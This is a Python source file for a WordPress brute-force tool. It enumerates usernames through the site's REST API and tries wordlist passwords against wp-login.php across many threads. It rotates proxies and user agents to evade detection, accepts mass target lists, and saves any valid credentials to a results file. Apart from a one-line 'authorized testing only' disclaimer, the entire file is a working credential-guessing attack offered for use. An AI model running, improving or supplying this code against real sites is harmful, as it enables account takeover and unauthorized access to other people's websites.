import requests
import threading
import os
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
import random
import colorama
from colorama import Fore, Style
from urllib.parse import urlparse
from tqdm import tqdm

colorama.init(autoreset=True)

# Configuration
CONFIG = {
    'curl_timeout': 20,
    'max_threads': 10,
    'proxy_rotation': True,
    'request_retries': 3,
    'user_agent_rotation': True
}

# Constants
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
]

# Initialize logging
logging.basicConfig(
    filename="bruteforce.log",
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)

# Thread-safe counters
request_counter = 0
lock = threading.Lock()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def validate_url(url):
    parsed = urlparse(url)
    if not parsed.scheme:
        return f"http://{url}"
    return url

def get_user_wp_json(target, proxies=None):
    try:
        headers = {'User-Agent': get_user_agent()}
        response = requests.get(
            f"{target}/wp-json/wp/v2/users",
            timeout=CONFIG['curl_timeout'],
            proxies=proxies,
            headers=headers,
            verify=False  # Disable SSL verification for testing (not recommended for production)
        )
        
        if response.status_code == 200:
            users = [user['slug'] for user in response.json()]
            if users:
                return users
    except requests.exceptions.RequestException as e:
        logging.error(f"WP-JSON Error for {target}: {str(e)}")
    return []

def get_user_agent():
    return random.choice(USER_AGENTS) if CONFIG['user_agent_rotation'] else USER_AGENTS[0]

def test_login(target, username, password, proxy=None):
    global request_counter
    try:
        session = requests.Session()
        headers = {'User-Agent': get_user_agent()}
        proxies = {'http': proxy, 'https': proxy} if proxy else None
        
        response = session.post(
            f"{target}/wp-login.php",
            data={'log': username, 'pwd': password, 'wp-submit': 'Log In'},
            timeout=CONFIG['curl_timeout'],
            headers=headers,
            proxies=proxies,
            allow_redirects=True,
            verify=False  # Disable SSL verification for testing (not recommended for production)
        )
        
        with lock:
            request_counter += 1
        
        # Check for successful login indicators
        if any([
            'wp-admin' in response.url,
            'Dashboard' in response.text,
            'logout' in response.text.lower()
        ]):
            result = f"{Fore.GREEN}[+] Valid credentials found: {username}:{password}{Style.RESET_ALL}"
            logging.info(f"Valid credentials for {target}: {username}:{password}")
            return (True, result, username, password)
        
        return (False, f"{Fore.RED}[-] Invalid: {username}:{password}{Style.RESET_ALL}")
    
    except requests.exceptions.RequestException as e:
        logging.warning(f"Request failed for {username}:{password} - {str(e)}")
        return (False, f"{Fore.YELLOW}[-] Connection error: {username}:{password}{Style.RESET_ALL}")

def load_file(file_path, description):
    try:
        with open(file_path, 'r') as f:
            items = [line.strip() for line in f if line.strip()]
            print(f"{Fore.GREEN}[+] Loaded {len(items)} {description}{Style.RESET_ALL}")
            return items
    except FileNotFoundError:
        print(f"{Fore.RED}[-] {description} file not found: {file_path}{Style.RESET_ALL}")
        return []

def show_progress(total):
    pbar = tqdm(total=total, desc="Progress", unit=" attempt")
    return pbar

def main():
    clear_screen()
    print_banner()
    
    # Input handling
    targets = get_targets()
    passwords = get_wordlist()
    proxies = get_proxies()
    
    # Process each target
    for target in targets:
        target = validate_url(target)
        print(f"\n{Fore.CYAN}[*] Targeting: {target}{Style.RESET_ALL}")
        
        # Get usernames
        usernames = get_user_wp_json(target) or []
        if not usernames:
            print(f"{Fore.YELLOW}[-] No usernames found, using default 'admin'{Style.RESET_ALL}")
            usernames = ['admin']
        
        # Prepare attack
        total_attempts = len(usernames) * len(passwords)
        pbar = show_progress(total_attempts)
        stop_event = threading.Event()
        
        # Thread pool
        with ThreadPoolExecutor(max_workers=CONFIG['max_threads']) as executor:
            futures = []
            for username in usernames:
                for password in passwords:
                    proxy = random.choice(proxies) if proxies and CONFIG['proxy_rotation'] else None
                    futures.append(executor.submit(test_login, target, username, password, proxy))
            
            # Process results
            for future in as_completed(futures):
                if stop_event.is_set():
                    for f in futures:
                        f.cancel()
                    break
                
                result = future.result()
                pbar.update(1)
                
                if result[0]:  # If valid credentials found
                    print(result[1])
                    save_result(target, result[2], result[3])
                    stop_event.set()
                else:
                    print(result[1])
        
        pbar.close()

def print_banner():
    clear_screen()
    print(f"""{Fore.YELLOW}
         _____   ______ ______   _____   ______ _______ _______ _______
        |  |  | |     | |_____/ |     \ |_____] |_____/ |______ |______
        |__|__| |_____| |    \_ |_____/ |       |    \_ |______ ______|
                                                                        
                    {Fore.WHITE}W O R D P R E S S   B R U T E F O R C E   T O O L           
          {Fore.BLUE}Advanced Version with Enhanced Features
          {Fore.WHITE}Author : {Fore.YELLOW}Kanezama & seanarv1n
    {Style.RESET_ALL}""")
    print(f"{Fore.BLUE}This tool is for authorized security testing only{Style.RESET_ALL}")

def get_targets():
    choice = input(Fore.CYAN + "\n[1] Single Target\n[2] Mass Target\n\nChoose an option: ").strip()
    if choice == '1':
        target = input(Fore.GREEN + "[!] Enter target URL: ").strip()
        return [validate_url(target)]
    elif choice == '2':
        target_file = input(Fore.GREEN + "[!] Enter targets file path: ").strip()
        return load_file(target_file, "targets")
    else:
        print(f"{Fore.RED}[-] Invalid choice!{Style.RESET_ALL}")
        exit(1)

def get_wordlist():
    default_path = "pwd.txt"
    if os.path.exists(default_path):
        use_default = input(f"{Fore.GREEN}[+] Found {default_path} - Use it? (y/n): ").strip().lower()
        if use_default == 'y':
            return load_file(default_path, "passwords")
    
    custom_path = input(Fore.GREEN + "[!] Enter wordlist path: ").strip()
    return load_file(custom_path, "passwords")

def get_proxies():
    use_proxy = input(Fore.GREEN + "[?] Use proxies? (y/n): ").strip().lower()
    if use_proxy != 'y':
        return []
    
    proxy_file = input(Fore.GREEN + "[!] Enter proxy file path: ").strip()
    return load_file(proxy_file, "proxies")

def save_result(target, username, password):
    with open("results.txt", "a") as f:
        f.write(f"{target} {username}:{password}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[-] Process interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        logging.error(f"Critical error: {str(e)}")
        print(f"{Fore.RED}[-] An unexpected error occurred. Check logs for details{Style.RESET_ALL}")
